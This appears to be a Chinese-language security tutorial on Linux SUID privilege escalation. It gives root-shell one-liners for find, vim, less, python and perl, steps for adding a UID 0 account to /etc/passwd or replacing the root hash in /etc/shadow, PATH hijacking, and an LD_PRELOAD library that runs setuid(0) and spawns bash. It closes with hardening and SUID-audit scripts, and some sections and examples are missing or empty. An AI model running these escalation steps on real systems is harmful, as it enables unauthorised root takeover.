# (一)前置基础

## SUID定义

- **设置用户ID权限位**

<u>SUID</u>（Set User ID）是<u>Linux文件系统</u>中的一种<u>特殊权限位</u>

当一个可执行文件被设置了SUID位后，任何用户在执行这个文件时，进程会<u>以文件所有者的身份运行</u>，而不是执行者自己的身份

- **执行时文件所有者权限**

**SUID核心机制**：

```
- 普通情况：用户A执行程序，进程以用户A的权限运行
- SUID情况：用户A执行带SUID的程序(所有者是root)，进程以root权限运行
```

举例：普通用户执行`passwd`命令修改密码时，需要写入`/etc/shadow`文件，但这个文件只有root能写。因为`passwd`设置了SUID位且所有者是root，所以普通用户执行时临时获得了root权限。

- **出现在文件拥有者执行位上**

SUID位体现在权限的第4位（所有者执行位）

```bash
-rwsr-xr-x  # s出现在所有者执行位，表示有SUID
-rwxr-xr-x  # 普通的x，没有SUID
-rwSr-xr-x  # 大写S表示设置了SUID但没有执行权限（无效配置）
```

可以参考一下GEEK2025 ez_read

## SUID作用+典型场景

- **允许普通用户以root权限执行特定程序**

SUID的设计初衷是让普通用户能够完成某些需要高权限的操作，但又不需要给用户完整的root权限。这是一种受控的权限提升机制

- **典型引用场景**

**passwd命令**

```bash
ls -l /usr/bin/passwd
-rwsr-xr-x 1 root root 68208 /usr/bin/passwd
```

普通用户需要修改自己的密码，但密码存储在`/etc/shadow`（只有root可写），通过SUID机制解决这个矛盾

**ping命令**

```bash
ls -l /bin/ping
-rwsr-xr-x 1 root root 44168 /bin/ping
```

ping需要打开原始网络套接字（raw socket），这需要root权限，普通用户通过SUID可以使用ping

**su命令**

```bash
ls -l /bin/su
-rwsr-xr-x 1 root root 34896 /bin/su
```

切换用户需要验证密码并改变进程身份，需要root权限

- **权限临时提升机制**

```
临时性：只在程序执行期间有效，程序结束后权限恢复

受限性：只能执行该程序定义的操作，不能任意执行命令

透明性：用户无需输入root密码，无感知地完成权限提升
```

## SUID标识

### 权限位表示方法

Linux权限由 **10** 位字符组成

```bash
-rwsr-xr-x
│││││││││└─ 其他用户执行权限
││││││││└── 其他用户写权限
│││││││└─── 其他用户读权限
││││││└──── 组执行权限
│││││└───── 组写权限
││││└────── 组读权限
│││└─────── 所有者执行权限（s表示SUID+执行）
││└──────── 所有者写权限
│└───────── 所有者读权限
└────────── 文件类型（-普通文件 d目录 l链接）
```

关注第4文件拥有者执行位

- **s** **：**有SUID且有执行权限(正常可用)

- **S** **：**有SUID但无执行权限(配置错误，无法执行)

### 数字表示

Linux权限可用数字表示，SUID用 **4** 表示：

```bash
chmod 4755 file  # 设置SUID + rwxr-xr-x
chmod 755 file   # 普通权限 rwxr-xr-x
```

**数字权限结构**

```bash
4755
│└─┴─ 基本权限（755 = rwxr-xr-x）
└──── 特殊权限位（4=SUID, 2=SGID, 1=Sticky）
```

- **4755** **：**SUID + rwxr-xr-x

- **4750** **：**SUID + rwxr-x---
- **6755** **：**SUID+SGID + rwxr-xr-x

**检查执行权限**

```bash
# 查看文件权限
ls -l /usr/bin/find
-rwsr-xr-x 1 root root 320160 /usr/bin/find
#    │  │ │
#    │  │ └─ 其他用户可执行（当前用户可以执行）
#    │  └─── 组用户可执行

# 测试是否可执行
which find
/usr/bin/find

find (GNU findutils) 4.8.0
# 可以正常执行
```

**不可执行的情况**

```bash
ls -l /usr/bin/某程序
-rwsr-x--- 1 root admin 12345 /usr/bin/某程序
#       └─ 其他用户无执行权限

# 当前用户不在admin组，无法执行
./某程序
bash: ./某程序: Permission denied
```

- **SUID程序存在可利用点**

**可执行shell命令**

```bash
# find命令的-exec参数
find /etc/passwd -exec whoami \;
root    # 以root身份执行

# nmap的交互模式（旧版本）
nmap --interactive
nmap> !sh
# 获得root shell
```

**可以进入交互式环境**

```bash
# vim编辑器
vim /etc/passwd
# 在vim中输入
:set shell=/bin/bash
:shell
# 获得root shell

# less/more查看器
less /etc/passwd
# 输入
!/bin/bash
# 获得root shell
```

**可以执行脚本代码**

```bash
# python解释器
python -c 'import os; os.system("/bin/bash")'
# 获得root shell

# perl解释器
perl -e 'exec "/bin/bash";'
# 获得root shell
```

**可以修改系统文件**

```bash
# cp命令
cp /tmp/fake_passwd /etc/passwd
# 覆盖密码文件

# mv命令
mv /tmp/fake_shadow /etc/shadow
# 移动恶意文件覆盖
```

# (三)信息收集

## 查找SUID文件

### find / -perm -4000 -type f 2>/dev/null

```bash
find / -perm -4000 -type f 2>/dev/null
```

- **参数说明**

```
find /        : 从根目录开始搜索

-perm -4000   : 查找权限包含SUID位（4000）的文件

-type f       : 只查找普通文件（排除目录、链接等）

2>/dev/null   : 将错误信息重定向到空设备（隐藏"Permission denied"错误）
```

- **实际输出示例**

```bash
find / -perm -4000 -type f 2>/dev/null

/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/su
/bin/mount
/bin/umount
/bin/ping
/usr/bin/find        # 可利用
/usr/bin/vim.basic   # 可利用
/usr/local/bin/nmap  # 可利用
```

- **为什么要重定向错误**

```bash
# 不重定向错误的输出
find / -perm -4000 -type f

/usr/bin/passwd
find: '/root': Permission denied
find: '/proc/1234/task': Permission denied
/usr/bin/sudo
find: '/var/log/private': Permission denied
# 大量错误信息干扰结果

# 重定向后输出清晰
find / -perm -4000 -type f 2>/dev/null
/usr/bin/passwd
/usr/bin/sudo
# 只显示有权限访问的SUID文件
```



### find / -user root -perm -4000 -print 2>/dev/null

```bash
find / -user root -perm -4000 -print 2>/dev/null
```

- **参数说明**

```
/  : 搜索的起始目录为根目录（即全盘扫描）

-user root : 只查找所有者是root的文件

-perm -4000 : 权限包含SUID位

-print : 打印结果（默认行为，可省略）

2>/dev/null : 隐藏错误信息
```

- **与上一个命令的区别**

```bash
# 查找所有SUID文件（任何所有者）
find / -perm -4000 -type f 2>/dev/null
/usr/bin/passwd    # root所有
/home/user/myapp   # user所有（也有SUID）
/opt/app/tool      # app所有（也有SUID）

# 只查找root所有的SUID文件
find / -user root -perm -4000 -print 2>/dev/null
/usr/bin/passwd    # 只显示root所有的
/usr/bin/sudo
/bin/mount
```

- **实际应用**

```bash
# 查找并显示详细信息
find / -user root -perm -4000 -print 2>/dev/null | xargs ls -l

-rwsr-xr-x 1 root root  63736 /usr/bin/passwd
-rwsr-xr-x 1 root root  44528 /usr/bin/chsh
-rwsr-xr-x 1 root root 157192 /usr/bin/sudo
-rwsr-xr-x 1 root root 320160 /usr/bin/find    # 危险
```



### find / -perm -u=s -type f 2>/dev/null

```bash
find / -perm -u=s -type f 2>/dev/null
```

- **参数说明**

```
-perm -u=s ：匹配包含 SUID 权限的文件
     -perm：按文件权限查找
     -u=s：匹配用户位（User）上有 SUID 特殊权限的文件

-type f ：限定查找对象为普通文件（file），排除目录、设备等其他类型
```

- **数字与符号表示对比**

```bash
# 数字表示法
find / -perm -4000 -type f 2>/dev/null

# 符号表示法
find / -perm -u=s -type f 2>/dev/null

# 两者结果完全相同
```

- **符号表示详解**

```bash
# u=s  用户SUID位
find / -perm -u=s -type f 2>/dev/null

# g=s  组SGID位
find / -perm -g=s -type f 2>/dev/null

# o=t  其他用户Sticky位
find / -perm -o=t -type d 2>/dev/null

# 组合查找
find / -perm -u=s,g=s -type f 2>/dev/null  # 同时有SUID和SGID
```

### 查看/etc/sudoers配置

- **跟/etc/passwd区别**

```
# /etc/passwd
Linux 系统中存储所有用户账户基础信息的核心配置文件，是系统识别用户身份的基础数据库

# /etc/sudoers
Linux 系统中定义 sudo 提权规则的配置文件，控制哪些用户 / 组可以以 root（或其他用户）身份执行命令
```

- **配置文件位置**

```bash
/etc/sudoers          # 主配置文件
/etc/sudoers.d/*      # 额外配置文件目录
```

- **查看配置**

```bash
# 方法1：直接查看（需要root权限）
cat /etc/sudoers
cat: /etc/sudoers: Permission denied

# 方法2：如果有读权限
cat /etc/sudoers | grep -v "^#" | grep -v "^$"

# 方法3：查看sudoers.d目录
ls -la /etc/sudoers.d/
```

- **配置文件语法**

```bash
# 基本格式
用户 主机=(运行身份) 命令

root ALL=(ALL:ALL) ALL
# root可以在所有主机上，以任何用户身份，执行任何命令

# 示例2：普通用户需要密码
user ALL=(ALL) ALL
# user可以执行所有命令，但需要输入密码

# 示例4：多个命令

# 可以执行多个命令

# 示例5：用户组
%admin ALL=(ALL) ALL
# admin组的所有用户可以执行所有命令
```

<u>-p参数的含义</u>

```bash
# -p (privileged) 特权模式
# 阻止bash丢弃SUID给予的权限

# 不加-p（提权失败）
/bin/bash
bash$ whoami
www-data    # 权限被丢弃

# 加-p（提权成功）
/bin/bash -p
bash-5.0# whoami
root        # 保持了SUID权限
```

<u>三种利用方式</u>

- **直接执行**

```bash

# 验证

uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root)
# euid=0说明有root有效权限
```

- **指定完整路径**

```bash
/bin/bash -p

# 或
/usr/bin/bash -p
```

- **其它程序调用**

```bash

# 通过find调用

```

**euid与uid的区别**

```bash
bash-5.0# id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root)

# uid=33  真实用户ID（www-data）
# euid=0  有效用户ID（root）
# 操作系统用euid判断权限，所以有root权限
```

## 覆盖系统文件

### /etc/passwd覆盖

- **passwd文件格式**

```bash
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
# 字段：用户名:密码占位:UID:GID:描述:主目录:shell
# x表示密码在/etc/shadow中

# 自定义用户格式
hacker:$1$xxx$yyy:0:0:root:/root:/bin/bash
#      │         │ │
#      │         │ └─ GID=0（root组）
#      │         └─── UID=0（root权限）
#      └─────────────── 密码哈希
```

- **覆盖流程**

```bash
# 1. 备份原文件
cp /etc/passwd /tmp/passwd.bak

# 2. 查看当前内容
cat /etc/passwd

# 3. 生成密码哈希
openssl passwd -1 -salt hack hack123
$1$hack$abc123def456...

# 4. 创建新用户行
echo 'hacker:$1$hack$abc123def456:0:0:root:/root:/bin/bash' >> /etc/passwd

# 5. 切换到新用户
su hacker
Password: hack123
root@target:~# id
uid=0(root) gid=0(root) groups=0(root)
```

- **直接去掉root密码**

```bash
# 将root的x改为空（不需要密码）
sed -i 's/root:x:/root::/' /etc/passwd

# 直接切换到root
su root
root@target:~#
```

### /etc/shadow覆盖

- **shadow文件格式**

```bash
cat /etc/shadow
root:$6$salt$hash:18000:0:99999:7:::
# 字段：用户名:密码哈希:最后修改:最小:最大:警告:过期:禁用:保留

# 密码哈希格式
$6$salt$hash   # SHA-512
$5$salt$hash   # SHA-256
$1$salt$hash   # MD5
$y$salt$hash   # yescrypt（现代系统）
```

- **生成新密码哈希**

```bash
# SHA-512格式（推荐）
openssl passwd -6 -salt hack hack123
$6$hack$abc123...

# MD5格式
openssl passwd -1 -salt hack hack123
$1$hack$abc123...

# python生成
python3 -c "
import crypt
print(crypt.crypt('hack123', crypt.mksalt(crypt.METHOD_SHA512)))
"
```

- **覆盖shadow流程**

```bash
# 1. 复制shadow到/tmp（需要能读）
# 如果有SUID程序可以读shadow
find / -name shadow -exec cat {} \; 2>/dev/null > /tmp/shadow

# 2. 生成新的root密码哈希
newpass=$(openssl passwd -6 -salt hack hack123)

# 3. 替换root密码行
sed -i "s|^root:.*|root:$newpass:18000:0:99999:7:::|" /tmp/shadow

# 4. 用具有SUID的cp/mv覆盖
cp /tmp/shadow /etc/shadow

# 5. 使用新密码登录

Password: hack123
root@target:~#
```

## 环境变量利用

### PATH劫持

- **原理**

```bash
# 当SUID程序调用其他程序时
# 如果使用相对路径而不是绝对路径
# 可以通过修改PATH变量来劫持

# 正常调用
/usr/bin/service apache2 start
# 使用了绝对路径，安全

# 不安全的调用（在SUID程序源码中）
system("service apache2 start")
# 使用相对路径，存在PATH劫持漏洞
```

- **判断是否存在PATH劫持**

```bash
# 1. 找到SUID程序
ls -l /usr/local/bin/vulnerable
-rwsr-xr-x 1 root root 8720 /usr/local/bin/vulnerable

# 2. 运行查看调用了哪些程序
strace /usr/local/bin/vulnerable 2>&1 | grep -i "exec\|path\|open"

# 3. 用strings查看程序内部字符串
strings /usr/local/bin/vulnerable
/lib64/ld-linux-x86-64.so.2
...
service        # 没有绝对路径！可以劫持
...

# 4. 用ltrace查看库调用
ltrace /usr/local/bin/vulnerable
```

- **PATH劫持提权**

```bash
# 1. 创建恶意程序
cat > /tmp/service << EOF
#!/bin/bash
/bin/bash -p
EOF
chmod +x /tmp/service

# 2. 修改PATH，将/tmp放在最前面
export PATH=/tmp:$PATH

# 3. 执行SUID程序（它会调用/tmp/service而不是/usr/sbin/service）
/usr/local/bin/vulnerable

# 4. 获得root shell
bash-5.0# whoami
root
```

- **完整示例**

```bash
# 发现vulnerable程序调用了ps命令（不带绝对路径）
strings /usr/local/bin/suid_prog | grep -v "/"
ps
whoami
service

# 创建假的ps命令
echo '/bin/bash -p' > /tmp/ps
chmod +x /tmp/ps

# 劫持PATH
export PATH=/tmp:$PATH

# 执行SUID程序，触发ps调用
/usr/local/bin/suid_prog

# 获得root shell
root@target:~#
```

### LD_PRELOAD利用

- **原理**

```bash
# LD_PRELOAD可以在程序加载时预先加载指定的共享库
# 通过预加载恶意库，可以劫持程序的函数调用

# 注意：普通SUID程序会忽略LD_PRELOAD
# 但如果sudo的sudoers中配置了env_keep+=LD_PRELOAD
# 则可以利用
```

- **适用场景(sudo配置)**

```bash
# sudo -l 显示
sudo -l

Matching Defaults entries for user on target:
    env_keep+=LD_PRELOAD    # 关键！保留了LD_PRELOAD

User user may run the following commands:
    (root) NOPASSWD: /usr/sbin/apache2
```

- **利用步骤**

```bash
# 1. 创建恶意C代码
cat > /tmp/evil.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOF

# 2. 编译为共享库
gcc -fPIC -shared -o /tmp/evil.so /tmp/evil.c -nostartfiles

# 3. 使用sudo并指定LD_PRELOAD
sudo LD_PRELOAD=/tmp/evil.so apache2

# 4. 获得root shell
root@target:~# whoami
root
```

- **原理说明**

```bash
# _init()函数在共享库加载时自动执行
# unsetenv去除LD_PRELOAD防止循环调用
# setuid(0)设置UID为root
# 然后执行bash
```

### 自定义函数劫持

- **原理**

```bash
# 在bash中可以定义与程序同名的函数
# 如果SUID程序通过bash调用命令，会优先执行函数
# 函数劫持环境变量会被传递给子进程
```

<u>四种利用方式</u>

- **函数劫持**

```bash
# 定义恶意函数（覆盖系统命令）
function /usr/sbin/service() {
    /bin/bash -p
}
export -f /usr/sbin/service

# 执行SUID程序（如果它调用service）
/usr/local/bin/vulnerable_suid
```

- **利用bash函数导出**

```bash
# 定义并导出函数（Shellshock风格）
export PS1='$(bash -p)'

# 或直接定义函数
env 'BASH_FUNC_ls%%=() { /bin/bash -p; }' ls
```

- **IFS劫持**

```bash
# IFS（内部字段分隔符）劫持
# 如果SUID程序使用了特殊字符分割命令
IFS="/"
export IFS

# 某些老版本系统中
# 程序调用 /bin/bash 时
# 因为IFS=/，会被解析为 "" "bin" "bash"
# 可能导致执行bin而不是/bin/bash
```

- **bash别名劫持**

```bash
# 如果SUID脚本调用了命令
# 且在bash别名作用范围内

alias cat='cat /etc/shadow'
alias ls='/bin/bash -p'

# 当SUID bash脚本调用cat或ls时
# 实际执行的是我们定义的别名
```

## 权限管理

### 最小权限原则

只给程序和用户做工作所需要的最小权限就够了

```bash
# 1. 查找所有SUID文件
find / -perm -4000 -type f 2>/dev/null

# 2. 评估每个SUID文件是否必要
ls -l /usr/bin/vim
-rwsr-xr-x 1 root root 3166216 /usr/bin/vim
# 问：vim需要SUID吗？通常不需要

# 3. 确认必要的SUID程序（默认合理的）
/usr/bin/passwd      # 需要：修改密码
/usr/bin/sudo        # 需要：权限管理
/bin/su              # 需要：切换用户
/bin/mount           # 需要：挂载文件系统
/bin/ping            # 看情况：可以用capabilities替代

# 4. 不应有SUID的程序
/usr/bin/vim         # 编辑器不需要SUID
/usr/bin/find        # 文件查找不需要SUID
/usr/bin/nmap        # 网络扫描不需要SUID
/usr/bin/python      # 解释器不需要SUID
```

### 定期审计SUID文件

- **建立基线**

```bash
# 首次记录所有SUID文件（基线）
find / -perm -4000 -type f 2>/dev/null | sort > /root/suid_baseline.txt
find / -perm -2000 -type f 2>/dev/null | sort >> /root/suid_baseline.txt

# 定期比较
find / -perm -4000 -type f 2>/dev/null | sort > /tmp/suid_current.txt
diff /root/suid_baseline.txt /tmp/suid_current.txt

# 如果有新增文件
# < 表示基线有但当前没有（文件被删除）
# > 表示当前有但基线没有（新增SUID文件）
```

- **自动化审计脚本**

```bash
#!/bin/bash
# /etc/cron.daily/suid_audit.sh

BASELINE="/root/suid_baseline.txt"
CURRENT="/tmp/suid_current_$(date +%Y%m%d).txt"
LOG="/var/log/suid_audit.log"

find / -perm -4000 -type f 2>/dev/null | sort > $CURRENT

if [ -f $BASELINE ]; then
    DIFF=$(diff $BASELINE $CURRENT)
    if [ -n "$DIFF" ]; then
        echo "[$(date)] SUID文件变化检测到！" >> $LOG
        echo "$DIFF" >> $LOG
        # 发送告警邮件
        echo "$DIFF" | mail -s "SUID文件变化告警" admin@example.com
    fi
fi

cp $CURRENT $BASELINE
```

```bash
    tar zip
    git svn
    lua tclsh
    mysql sqlite3
)

echo "=== SUID加固扫描 ==="
for cmd in "${NO_SUID_LIST[@]}"; do
    path=$(which $cmd 2>/dev/null)
    if [ -n "$path" ]; then
        perm=$(stat -c "%A" $path 2>/dev/null)
        if [[ $perm == *"s"* ]]; then
            echo "[警告] $path 存在SUID位: $perm"
            echo "  移除命令: chmod u-s $path"
        fi
    fi
done
```

### 使用capabilities替代

- **是什么**

```bash
# Linux capabilities将root权限分为多个独立的权限单元
# 程序可以只获得需要的特定capability，而不是整个root权限

# 常见capabilities
CAP_NET_BIND_SERVICE   # 绑定1024以下端口
CAP_NET_RAW            # 使用原始套接字（ping需要）
CAP_DAC_READ_SEARCH    # 读取任意文件
CAP_SETUID             # 改变用户ID
CAP_SYS_ADMIN          # 系统管理操作
```

- **用capabilities替代SUID**

```bash
# ping命令传统上需要SUID
ls -l /bin/ping
-rwsr-xr-x 1 root root 44168 /bin/ping

# 移除SUID位
chmod u-s /bin/ping

# 使用capability替代（只给需要的权限）
setcap cap_net_raw+ep /bin/ping

# 验证
getcap /bin/ping
/bin/ping = cap_net_raw+ep

# 测试（普通用户仍然可以使用ping）
ping 8.8.8.8
PING 8.8.8.8 ...    # 正常工作
```

- **查看已有capabilities**

```bash
# 查看所有具有capability的文件
getcap -r / 2>/dev/null

/usr/bin/ping = cap_net_raw+ep
/usr/bin/wireshark = cap_net_raw,cap_net_admin+eip
/usr/sbin/tcpdump = cap_net_raw,cap_net_admin+eip

# 某些capabilities可能被用于提权
# cap_setuid+ep  可以设置UID，可能提权
# cap_dac_read_search  可以读取任意文件
```

- **简单SUID监控脚本**

```bash
#!/bin/bash
# /usr/local/bin/monitor_suid.sh

BASELINE="/root/.suid_baseline"
ALERT_LOG="/var/log/suid_alert.log"

current=$(find / -perm -4000 -type f 2>/dev/null | md5sum)

if [ -f "$BASELINE" ]; then
    baseline=$(cat $BASELINE)
    if [ "$current" != "$baseline" ]; then
        timestamp=$(date '+%Y-%m-%d %H:%M:%S')
        echo "[$timestamp] SUID文件发生变化！" >> $ALERT_LOG
        
        # 记录详细变化
        find / -perm -4000 -type f 2>/dev/null > /tmp/suid_now
        diff /root/.suid_baseline_files /tmp/suid_now >> $ALERT_LOG
        
        # 发送告警
        logger -t SUID_MONITOR "检测到SUID文件变化，请检查 $ALERT_LOG"
    fi
fi

echo $current > $BASELINE
find / -perm -4000 -type f 2>/dev/null > /root/.suid_baseline_files
```

- **检测异常的SUID执行行为**

```bash
# 监控以root有效ID运行但真实UID不是root的进程
ps aux | awk '{if ($1 != "root" && $11 != "") print $1, $2, $11}'

# 查看进程的实际UID和有效UID
cat /proc/*/status 2>/dev/null | grep -E "Name|Uid" | paste - -

# 监控/proc/*/status中的特权进程
for pid in /proc/[0-9]*/status; do
    name=$(grep "Name:" $pid 2>/dev/null | awk '{print $2}')
    uid=$(grep "^Uid:" $pid 2>/dev/null | awk '{print $2}')
    euid=$(grep "^Uid:" $pid 2>/dev/null | awk '{print $3}')
    if [ "$uid" != "0" ] && [ "$euid" = "0" ]; then
        echo "可疑进程: PID=$pid Name=$name UID=$uid EUID=$euid"
    fi
done
```
